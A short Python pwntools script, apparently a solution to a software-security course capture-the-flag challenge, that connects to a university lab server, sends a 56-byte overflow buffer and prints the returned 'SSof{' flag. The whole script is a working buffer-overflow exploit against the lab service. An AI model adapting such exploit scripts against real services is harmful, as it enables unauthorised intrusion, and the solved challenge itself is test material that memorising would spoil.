from pwn import remote

SERVER = "mustard.stt.rnl.tecnico.ulisboa.pt"
PORT = 23161

remote = remote(SERVER, PORT, timeout=10000)

buffer = b"a" * 8 + b"a" * 40 + b"a" * 8 + b"\n"

remote.sendline(buffer)
flag = remote.recvline_contains(b"SSof{")
print(flag.decode().split()[-1])